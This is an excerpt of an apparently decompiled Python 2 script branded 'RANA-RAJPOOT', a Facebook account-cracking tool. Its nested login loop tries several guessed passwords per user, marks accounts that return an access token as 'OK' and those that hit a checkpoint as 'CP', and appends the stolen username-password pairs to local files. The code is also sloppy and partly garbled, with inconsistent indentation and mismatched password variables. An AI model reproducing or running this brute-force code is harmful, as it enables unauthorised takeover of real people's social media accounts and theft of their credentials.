...
# Github : https://www.facebook.com/subhan.shahzad.52012
# uncompyle6 version 1.1.1
...
\x1b[38;5;9m
oooooooooo       o        ooooo oooooooooo    ooooooo     ooooooo   ooooooooooo 
 888    888     888        888   888    888 o888   888o o888   888o 88  888  88 
 888oooo88     8  88       888   888oooo88  888     888 888     888     888     
 888  88o     8oooo88      888   888        888o   o888 888o   o888     888     
o888o  88o8 o88o  o888o    888  o888o         88ooo88     88ooo88      o888o    
                        8o888                                                   
...
\x1b[1;96m\033[1;96mGitHub   :            RANA-RAJPOOT
\x1b[1;96m\033[1;96mVersion  :            1.1.1
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;96m  [RANA-RAJPOOT_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [RANA-RAJPOOT_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [RANA-RAJPOOT_OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [RANA-RAJPOOT_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [RANA-RAJPOOT_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                       ...
                       q = json.load(data)
                       if 'access_token' in q:
                        print '\x1b[1;96m  [RANA-RAJPOOT_OK]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass4 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                       elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [RANA-RAJPOOT_CP] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/CP.txt', 'a')
    ...
    raw_input('\n\x1b[1;97m[\x1b[1;98mRANA-RAJPOOT_menu_Back\x1b[1;95m]')
    login()
